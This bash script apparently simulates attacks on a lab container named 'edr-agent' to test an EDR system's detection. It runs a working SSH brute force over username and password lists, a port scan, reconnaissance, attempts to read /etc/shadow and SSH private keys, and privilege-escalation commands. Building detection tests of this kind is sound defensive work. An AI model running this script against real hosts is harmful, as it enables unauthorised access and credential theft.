#!/bin/bash

echo "🔥 STARTING BRUTE FORCE ATTACK SIMULATION"
echo "========================================"

# Target agent container
TARGET_HOST="edr-agent"
TARGET_PORT="22"

# Wait for network to be ready
sleep 10

echo "🎯 Target: $TARGET_HOST:$TARGET_PORT"
echo "📝 Attack Type: SSH Brute Force"
echo ""

# Common passwords for brute force
PASSWORDS=(
    "123456"
    "password" 
    "admin"
    "root"
    "test"
    "login"
    "pass"
    "qwerty"
    "letmein"
    "welcome"
    "monkey"
    "dragon"
    "master"
    "shadow"
    "guest"
    "default"
    "service"
    "ubuntu"
    "user"
    "demo"
)

# Common usernames
USERNAMES=(
    "root"
    "admin"
    "administrator"
    "user"
    "test"
    "guest"
    "ubuntu"
    "service"
    "oracle"
    "mysql"
    "postgres"
    "www-data"
    "nobody"
    "daemon"
    "operator"
    "backup"
    "ftp"
    "mail"
    "ssh"
    "tomcat"
)

echo "🚀 Starting SSH brute force attack..."
echo "⏰ $(date)"
echo ""

ATTEMPT=1
for username in "${USERNAMES[@]}"; do
    for password in "${PASSWORDS[@]}"; do
        echo "🔍 Attempt $ATTEMPT: Trying $username:$password"
        
        # SSH brute force attempt với timeout
        timeout 5 sshpass -p "$password" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$username@$TARGET_HOST" "whoami" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo "✅ SUCCESS! Found credentials: $username:$password"
            # Log successful breach
            echo "$(date): BREACH SUCCESSFUL - $username:$password" >> /var/log/attack.log
        else
            echo "❌ Failed: $username:$password"
        fi
        
        # Delay between attempts (realistic brute force)
        sleep 2
        ATTEMPT=$((ATTEMPT + 1))
        
        # Log every attempt for EDR detection
        echo "$(date): SSH_BRUTE_FORCE_ATTEMPT user=$username password=$password target=$TARGET_HOST" >> /var/log/attack.log
    done
done

echo ""
echo "🔥 Executing additional malicious activities..."

# Multiple login failures to trigger account lockout detection
for i in {1..20}; do
    echo "🔐 Login failure simulation $i/20"
    timeout 3 sshpass -p "wrong_password" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@$TARGET_HOST "whoami" 2>/dev/null
    echo "$(date): MULTIPLE_LOGIN_FAILURES attempt=$i user=root target=$TARGET_HOST" >> /var/log/attack.log
    sleep 1
done

# Port scanning simulation
echo "🔍 Port scanning target..."
for port in 21 22 23 25 53 80 110 143 443 993 995 3389 5432 3306; do
    echo "🌐 Scanning port $port"
    timeout 2 nc -z -v $TARGET_HOST $port 2>&1 | grep -q "succeeded" && echo "Port $port OPEN" || echo "Port $port closed"
    echo "$(date): PORT_SCAN target=$TARGET_HOST port=$port" >> /var/log/attack.log
    sleep 0.5
done

# Network reconnaissance 
echo "🕵️ Network reconnaissance..."
nmap -sn edr-agent 2>/dev/null || echo "Nmap not available, using ping"
ping -c 3 edr-agent
echo "$(date): NETWORK_RECONNAISSANCE target=$TARGET_HOST" >> /var/log/attack.log

# Suspicious file access attempts
echo "📁 Attempting suspicious file access..."
SUSPICIOUS_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/root/.ssh/id_rsa"
    "/home/*/.ssh/id_rsa"
    "/var/log/auth.log"
    "/etc/mysql/my.cnf"
    "/etc/postgresql/postgresql.conf"
)

for file in "${SUSPICIOUS_FILES[@]}"; do
    echo "📂 Attempting to access: $file"
    timeout 3 sshpass -p "test" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@$TARGET_HOST "cat $file" 2>/dev/null
    echo "$(date): SUSPICIOUS_FILE_ACCESS file=$file target=$TARGET_HOST" >> /var/log/attack.log
    sleep 1
done

# Privilege escalation attempts
echo "⬆️ Privilege escalation attempts..."
ESCALATION_COMMANDS=(
    "sudo su -"
    "su root"
    "sudo -l"
    "find / -perm -4000 2>/dev/null"
    "cat /etc/sudoers"
    "whoami"
    "id"
    "groups"
)

for cmd in "${ESCALATION_COMMANDS[@]}"; do
    echo "🔓 Trying: $cmd"
    timeout 3 sshpass -p "test" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@$TARGET_HOST "$cmd" 2>/dev/null
    echo "$(date): PRIVILEGE_ESCALATION command='$cmd' target=$TARGET_HOST" >> /var/log/attack.log
    sleep 1
done

echo ""
echo "🎯 ATTACK SIMULATION COMPLETE"
echo "============================="
echo "📊 Total Attempts: $ATTEMPT"
echo "📁 Attack Log: /var/log/attack.log"
echo "⏰ Completed: $(date)"
echo ""
echo "🚨 EDR System should have detected:"
echo "   • SSH Brute Force attempts"
echo "   • Multiple login failures"
echo "   • Port scanning activity"
echo "   • Network reconnaissance"
echo "   • Suspicious file access"
echo "   • Privilege escalation attempts"
echo ""

# Keep container running for log analysis
echo "📋 Keeping container alive for monitoring..."
echo "🔍 Attack log contents:"
cat /var/log/attack.log 2>/dev/null || echo "No attack log found"

# Infinite loop to keep container running
while true; do
    echo "⏰ Attack simulation complete. EDR monitoring active. Time: $(date)"
    sleep 60
done
